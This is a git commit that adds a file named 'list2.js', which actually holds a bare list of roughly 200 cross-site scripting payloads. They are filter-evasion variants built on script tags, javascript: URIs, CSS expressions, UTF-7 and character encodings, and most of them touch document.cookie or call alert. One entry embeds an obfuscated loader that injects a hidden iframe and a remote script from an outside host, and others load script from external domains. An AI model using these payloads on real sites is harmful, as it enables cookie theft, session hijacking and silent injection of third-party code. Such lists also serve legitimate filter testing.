a77c6773f9b34e45be4bfc25aac12d32b7e87280
ཌ₢₷ད Anti <71287187+CS-Anti@users.noreply.github.com>
2020-10-18 16:41:17 -0700

    Create list2.js

---
+++ list2.js
@@ -0,0 +1,200 @@
+<meta http-equiv="refresh" content="0;url=javascript:document.cookie=true;">
+<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>document.cookie=true</SCRIPT>">
+<SCRIPT>document.cookie=true;</SCRIPT>
+<IMG SRC="jav ascript:document.cookie=true;">
+<IMG SRC="javascript:document.cookie=true;">
+<IMG SRC=" &#14; javascript:document.cookie=true;">
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=document.cookie=true;>
+<SCRIPT>document.cookie=true;//<</SCRIPT>
+<SCRIPT <B>document.cookie=true;</SCRIPT>
+<IMG SRC="javascript:document.cookie=true;">
+<iframe src="javascript:document.cookie=true;> 
+<SCRIPT>a=/XSS/\ndocument.cookie=true;</SCRIPT> 
+</TITLE><SCRIPT>document.cookie=true;</SCRIPT>
+<INPUT TYPE="IMAGE" SRC="javascript:document.cookie=true;">
+<BODY BACKGROUND="javascript:document.cookie=true;">
+<BODY ONLOAD=document.cookie=true;>
+<IMG DYNSRC="javascript:document.cookie=true;">
+<IMG LOWSRC="javascript:document.cookie=true;">
+<BGSOUND SRC="javascript:document.cookie=true;">
+<BR SIZE="&{document.cookie=true}">
+<LAYER SRC="javascript:document.cookie=true;"></LAYER>
+<LINK REL="stylesheet" HREF="javascript:document.cookie=true;">
+<STYLE>li {list-style-image: url("javascript:document.cookie=true;");</STYLE><UL><LI>XSS 
+�script�document.cookie=true;�/script� 
+<IFRAME SRC="javascript:document.cookie=true;"></IFRAME>
+<FRAMESET><FRAME SRC="javascript:document.cookie=true;"></FRAMESET>
+<TABLE BACKGROUND="javascript:document.cookie=true;">
+<TABLE><TD BACKGROUND="javascript:document.cookie=true;">
+<DIV STYLE="background-image: url(javascript:document.cookie=true;)">
+<DIV STYLE="background-image: url(&#1;javascript:document.cookie=true;)">
+<DIV STYLE="width: expression(document.cookie=true);">
+<STYLE>@im\port'\ja\vasc\ript:document.cookie=true';</STYLE>
+<IMG STYLE="xss:expr/*XSS*/ession(document.cookie=true)">
+<XSS STYLE="xss:expression(document.cookie=true)"> 
+exp/*<A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(document.cookie=true)'> 
+<STYLE TYPE="text/javascript">document.cookie=true;</STYLE> 
+<STYLE>.XSS{background-image:url("javascript:document.cookie=true");}</STYLE><A CLASS=XSS></A> 
+<STYLE type="text/css">BODY{background:url("javascript:document.cookie=true")}</STYLE> 
+<SCRIPT>document.cookie=true;</SCRIPT>
+<BASE HREF="javascript:document.cookie=true;//">
+<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:document.cookie=true></OBJECT>
+<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]<![CDATA[cript:document.cookie=true;">]]</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:document.cookie=true"></B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
+<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>document.cookie=true</SCRIPT>"><script>if(top==window){var engageNameSpace="engagens";"undefined"==typeof window[engageNameSpace]&&(window[engageNameSpace]={}),window[engageNameSpace].engageLoader=function(){function e(e){return"undefined"!=typeof e&&null!==e}function t(){var t=document.createElement("script");t.setAttribute("src",s),t.setAttribute("id","fn_engage_script"),t.setAttribute("async",""),(null==document.head||e(document.head))&&(document.head=document.getElementsByTagName("head")[0]),document.head.appendChild(t)}function n(){var t=r();if(e(t)){var n=t;i()&&(n=d(t));var o;try{o=document.documentElement,o.appendChild(n)}catch(c){o=document.body,o.appendChild(n)}a()}}function a(){function e(e){var n=e.data;"l8IframeIsReady"===n.message&&t()}window.addEventListener?window.addEventListener("message",e,!1):window.attachEvent("onmessage",e)}function r(){var t=document.createElement("iframe");if(e(t)){t.setAttribute("id","fn_engage"),t.setAttribute("src",u),t.setAttribute("target","_blank"),t.setAttribute("frameborder","0");var n=/firefox/i.exec(navigator.userAgent);e(n)&&n.length>0?(t.style.height=0,t.style.width=0):t.style.display="none",t.frameBorder="no"}return t}function i(){var t=!1,n=/android (\d+)/i.exec(navigator.userAgent);return e(n)&&n.length>0&&(t=parseInt(n[1])>=4),t}function d(e){var t=document.createElement("div");return t.setAttribute("id","fn_wrapper_div"),t.style.position="fixed",t.style.display="none",t.ontouchstart=function(){return!0},t.appendChild(e),t}function o(){var t=void 0,a=this,r=function(){e(t)&&(window.clearTimeout(t),t=void 0,n.call(a))};t=window.setTimeout(r,1e4),"function"==typeof window.addEventListener?window.addEventListener("load",r,!1):window.attachEvent("onload",r)}var c="http://globe.moreforme.net",u=c+"/l8/EngageService?v=1",s=c+"/scripts/Engage.js";o()};var engageLoader=new window[engageNameSpace].engageLoader}</script></BODY></HTML>
+<? echo('<SCR)';echo('IPT>document.cookie=true</SCRIPT>'); ?>
+<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-document.cookie=true;+ADw-/SCRIPT+AD4-
+<a href="javascript#document.cookie=true;">
+<div onmouseover="document.cookie=true;">
+<img src="javascript:document.cookie=true;">
+<img dynsrc="javascript:document.cookie=true;">
+<input type="image" dynsrc="javascript:document.cookie=true;">
+<bgsound src="javascript:document.cookie=true;">
+&<script>document.cookie=true;</script> 
+&{document.cookie=true;}; 
+<img src=&{document.cookie=true;};> 
+<link rel="stylesheet" href="javascript:document.cookie=true;"> 
+<img src="mocha:document.cookie=true;">@mario_payload
+<img src="livescript:document.cookie=true;"> 
+<a href="about:<script>document.cookie=true;</script>"> 
+<body onload="document.cookie=true;"> 
+<div style="background-image: url(javascript:document.cookie=true;);"> 
+<div style="behaviour: url([link to code]);"> 
+<div style="binding: url([link to code]);"> 
+<div style="width: expression(document.cookie=true;);">
+<style type="text/javascript">document.cookie=true;</style>
+<object classid="clsid:..." codebase="javascript:document.cookie=true;">
+<style><!--</style><script>document.cookie=true;//--></script>
+<<script>document.cookie=true;</script>
+<script>document.cookie=true;//--></script>
+<!-- -- --><script>document.cookie=true;</script><!-- -- -->
+<img src="blah"onmouseover="document.cookie=true;">
+<img src="blah>" onmouseover="document.cookie=true;">
+<xml src="javascript:document.cookie=true;">
+<xml id="X"><a><b><script>document.cookie=true;</script>;</b></a></xml>
+<div datafld="b" dataformatas="html" datasrc="#X"></div> ]]>  [\xC0][\xBC]script>document.cookie=true;[\xC0][\xBC]/script>
+
+>"<iframe src=http://global-evolution.info/>@gmail.com
+>"<script>alert(document.cookie)</script><div style="1@gmail.com
+>"<script>alert(document.cookie)</script>@gmail.com
+ 
+<html><body>
+<button.onclick="alert(String.fromCharCode(60,115,99,114,105,112,116,62,97,108,
+101,114,116,40,34,67,114,111,115,115,83,105,116,101,83,99,114,105,112,116,105,1
+10,103,64,82,69,77,79,86,69,34,41,60,47,115,99,114,105,112,116,62));">String:fr
+om.Char.Code</button></body></html>
+
+%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%22%43%72%6F
+%73%73%53%69%74%65%53%63%72%69%70%74%69%6E%67%32%22%29%3C%2F
+%73%63%72%69%70%74%3E
+
+>�<ScriPt>ALeRt("xssOBFSbypass")</scriPt>
+
+>"<meta http-equiv="refresh" content="0;url=javascript:document.cookie=true;">
+>"<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>document.cookie=true</SCRIPT>">
+>"<SCRIPT>document.cookie=true;</SCRIPT>
+>"<IMG SRC="jav ascript:document.cookie=true;">
+>"<IMG SRC="javascript:document.cookie=true;">
+>"<IMG SRC=" &#14; javascript:document.cookie=true;">
+>"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=document.cookie=true;>
+>"<SCRIPT>document.cookie=true;//<</SCRIPT>
+>"<SCRIPT <B>document.cookie=true;</SCRIPT>
+>"<IMG SRC="javascript:document.cookie=true;">
+>"<iframe src="javascript:document.cookie=true;> 
+>"<SCRIPT>a=/XSS/\ndocument.cookie=true;</SCRIPT> 
+>"</TITLE><SCRIPT>document.cookie=true;</SCRIPT>
+>"<INPUT TYPE="IMAGE" SRC="javascript:document.cookie=true;">
+>"<BODY BACKGROUND="javascript:document.cookie=true;">
+>"<BODY ONLOAD=document.cookie=true;>
+>"<IMG DYNSRC="javascript:document.cookie=true;">
+>"<IMG LOWSRC="javascript:document.cookie=true;">
+>"<BGSOUND SRC="javascript:document.cookie=true;">
+>"<BR SIZE="&{document.cookie=true}">
+>"<LAYER SRC="javascript:document.cookie=true;"></LAYER>
+>"<LINK REL="stylesheet" HREF="javascript:document.cookie=true;">
+>"<STYLE>li {list-style-image: url("javascript:document.cookie=true;");</STYLE><UL><LI>XSS 
+>"�script�document.cookie=true;�/script� 
+>"<IFRAME SRC="javascript:document.cookie=true;"></IFRAME>
+>"<FRAMESET><FRAME SRC="javascript:document.cookie=true;"></FRAMESET>
+>"<TABLE BACKGROUND="javascript:document.cookie=true;">
+>"<TABLE><TD BACKGROUND="javascript:document.cookie=true;">
+>"<DIV STYLE="background-image: url(javascript:document.cookie=true;)">
+>"<DIV STYLE="background-image: url(&#1;javascript:document.cookie=true;)">
+>"<DIV STYLE="width: expression(document.cookie=true);">
+>"<STYLE>@im\port'\ja\vasc\ript:document.cookie=true';</STYLE>
+>"<IMG STYLE="xss:expr/*XSS*/ession(document.cookie=true)">
+>"<XSS STYLE="xss:expression(document.cookie=true)"> 
+>"exp/*<A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(document.cookie=true)'> 
+>"<STYLE TYPE="text/javascript">document.cookie=true;</STYLE> 
+>"<STYLE>.XSS{background-image:url("javascript:document.cookie=true");}</STYLE><A CLASS=XSS></A> 
+>"<STYLE type="text/css">BODY{background:url("javascript:document.cookie=true")}</STYLE> 
+>"<SCRIPT>document.cookie=true;</SCRIPT>
+>"<BASE HREF="javascript:document.cookie=true;//">
+>"<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:document.cookie=true></OBJECT>
+>"<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]<![CDATA[cript:document.cookie=true;">]]</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+>"<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:document.cookie=true"></B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
+>"<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>document.cookie=true</SCRIPT>"></BODY></HTML>
+>"<? echo('<SCR)';echo('IPT>document.cookie=true</SCRIPT>'); ?>
+>"<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-document.cookie=true;+ADw-/SCRIPT+AD4-
+>"<a href="javascript#document.cookie=true;">
+>"<div onmouseover="document.cookie=true;">
+>"<img src="javascript:document.cookie=true;">
+>"<img dynsrc="javascript:document.cookie=true;">
+>"<input type="image" dynsrc="javascript:document.cookie=true;">
+>"<bgsound src="javascript:document.cookie=true;">
+>"&<script>document.cookie=true;</script> 
+>"&{document.cookie=true;}; 
+>"<img src=&{document.cookie=true;};> 
+>"<link rel="stylesheet" href="javascript:document.cookie=true;"> 
+>"<img src="mocha:document.cookie=true;"> 
+>"<img src="livescript:document.cookie=true;"> 
+>"<a href="about:<script>document.cookie=true;</script>"> 
+>"<body onload="document.cookie=true;"> 
+>"<div style="background-image: url(javascript:document.cookie=true;);"> 
+>"<div style="behaviour: url([link to code]);"> 
+>"<div style="binding: url([link to code]);"> 
+>"<div style="width: expression(document.cookie=true;);">
+>"<style type="text/javascript">document.cookie=true;</style>
+>"<object classid="clsid:..." codebase="javascript:document.cookie=true;">
+>"<style><!--</style><script>document.cookie=true;//--></script>
+>"<<script>document.cookie=true;</script>
+>"<script>document.cookie=true;//--></script>
+>"<!-- -- --><script>document.cookie=true;</script><!-- -- -->
+>"<img src="blah"onmouseover="document.cookie=true;">
+>"<img src="blah>" onmouseover="document.cookie=true;">
+>"<xml src="javascript:document.cookie=true;">
+>"<xml id="X"><a><b><script>document.cookie=true;</script>;</b></a></xml>
+>"<div datafld="b" dataformatas="html" datasrc="#X"></div> ]]>  [\xC0][\xBC]script>document.cookie=true;[\xC0][\xBC]/script>
+ 
+ ';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+'';!--"<XSS>=&{()}
+<SCRIPT SRC=http://test.com/xss.js></SCRIPT>
+<IMG SRC="javascript:alert('XSS');">
+<IMG SRC=javascript:alert('XSS')>
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+<IMG SRC=javascript:alert(&quot;XSS&quot;)>
+<IMG SRC=`javascript:alert("RM'XSS'")`>
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+<IMG SRC="jav	ascript:alert('XSS');">
+<IMG SRC="jav&#x09;ascript:alert('XSS');">
+<IMG SRC="jav&#x0A;ascript:alert('XSS');">
+<IMG SRC="jav&#x0D;ascript:alert('XSS');">
+<IMG
+SRC
+=
+"
+j
+a
+v
+><img id=XSS SRC=x onerror=alert(XSS);>
+;!--"<XSS>=&{()}"
+<IMG id=XSS SRC="javascript:alert('XSS');">
+<IMG id=XSS SRC=javascript:alert('XSS')>
+<IMG id=XSS SRC=JaVaScRiPt:alert('XSS')>
+<IMG id=XSS SRC=javascript:alert("XSS")>
+<IMG id=XSS SRC=`javascript:alert("'XSS'")`>
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+<IMG id=XSS SRC="jav ascript:alert('XSS');">
+<IMG id=XSS SRC="jav    ascript:alert('XSS');">
+<body id=XSS onscroll=eval(String['fromCharCode'](97,108,101,114,116,40,39,120,115,115,39,41,32))><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
